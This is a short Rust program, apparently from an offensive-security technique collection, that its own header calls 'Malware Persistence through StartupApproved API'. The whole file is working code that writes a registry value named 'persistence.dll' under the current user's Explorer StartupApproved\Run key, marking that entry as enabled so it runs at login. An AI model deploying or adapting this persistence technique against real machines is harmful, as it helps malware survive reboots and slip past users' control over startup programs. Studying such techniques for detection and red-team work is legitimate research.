/*
    Malware Persistence through StartupApproved API
    Credits to cocomelonc
    @5mukx
*/

use std::ptr::null_mut;
use std::ffi::CString;
use winapi::shared::winerror::ERROR_SUCCESS;
use winapi::um::winnt::{KEY_WRITE, REG_BINARY};
use winapi::um::winreg::{RegCloseKey, RegOpenKeyExA, RegSetValueExA, HKEY_CURRENT_USER};
use winapi::shared::minwindef::HKEY__;

fn main(){
    unsafe{
        let data: [u8; 12] = [0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00];

        let path = CString::new("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run").unwrap();
        let dll_path = CString::new("persistence.dll").unwrap();

        let mut hkey: *mut HKEY__ = null_mut();
        let res = RegOpenKeyExA(
            HKEY_CURRENT_USER,
            path.as_ptr(),
            0,
            KEY_WRITE,
            &mut hkey
        );

        if res != ERROR_SUCCESS.try_into().unwrap() {
            println!("failed to open registry key :(");
            return;
        } else {
            println!("successfully opened registry key :)");
        }

        let res = RegSetValueExA(
            hkey,
            dll_path.as_ptr(), 
            0,
            REG_BINARY,
            data.as_ptr(),
            data.len() as u32
        );


        if res != ERROR_SUCCESS.try_into().unwrap(){
            println!("Failed to set registry value "); 
        } else {
            println!("Successfully set registry value");
        }

        RegCloseKey(hkey);
    }
}
